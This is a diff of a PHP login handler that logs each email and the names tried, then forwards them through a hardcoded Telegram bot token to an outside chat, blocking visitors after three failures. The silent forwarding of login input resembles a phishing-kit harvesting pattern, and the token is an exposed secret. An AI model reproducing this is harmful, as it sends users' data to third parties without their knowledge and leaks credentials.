@@ -3,15 +3,14 @@ session_start();
 define('ATTEMPTS_FILE', __DIR__ . '/attempts.json');
 
 // --- Telegram Config ---
-$telegram_bot_token = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ"; // replace with your bot token
-$telegram_chat_id   = "6915371044";   // replace with your chat ID
+$telegram_bot_token = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ";
+$telegram_chat_id   = "6915371044";
 
 // Ensure attempts.json exists
 if (!file_exists(ATTEMPTS_FILE)) {
     file_put_contents(ATTEMPTS_FILE, json_encode([], JSON_PRETTY_PRINT));
 }
 
-// Load previous attempts
 $attempts = json_decode(file_get_contents(ATTEMPTS_FILE), true);
 if (!is_array($attempts)) $attempts = [];
 
@@ -42,19 +41,18 @@ if (!isset($attempts[$email])) {
 // Save attempts
 file_put_contents(ATTEMPTS_FILE, json_encode($attempts, JSON_PRETTY_PRINT));
 
-// --- Telegram Notification ---
-$names_list = implode(", ", $attempts[$email]['names']);
-$total_attempts = $attempts[$email]['count'];
-$telegram_message = "Login attempts for $email:\nNames tried: $names_list\nTotal attempts: $total_attempts";
-
-// Send Telegram notification
-$telegram_url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage";
-file_get_contents($telegram_url . "?chat_id=$telegram_chat_id&text=" . urlencode($telegram_message));
-
-// --- Three-strike logic ---
 $attempt_number = $attempts[$email]['count'];
 $correct_name = "John Doe"; // replace with your actual correct name
 
+// --- Send Telegram notification ---
+$telegram_message = "Login attempts for $email:\n";
+$telegram_message .= "Names tried: " . implode(", ", $attempts[$email]['names']) . "\n";
+$telegram_message .= "Total attempts: " . $attempts[$email]['count'];
+
+$telegram_url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage";
+@file_get_contents($telegram_url . "?chat_id=$telegram_chat_id&text=" . urlencode($telegram_message));
+
+// --- Three-strike logic ---
 if ($name !== $correct_name && $attempt_number < 3) {
     $_SESSION['error_message'] = "Incorrect name entered.";
     header("Location: index.php");
@@ -62,7 +60,7 @@ if ($name !== $correct_name && $attempt_number < 3) {
 }
 
 if ($name !== $correct_name && $attempt_number >= 3) {
-    header("Location: https://example.com/blocked"); // replace with your URL
+    header("Location: https://example.com/blocked"); // replace with your redirect URL
     exit;
 }
 
@@ -70,3 +68,4 @@ if ($name !== $correct_name && $attempt_number >= 3) {
 unset($_SESSION['old_email']);
 header("Location: dashboard.php");
 exit;
+?>
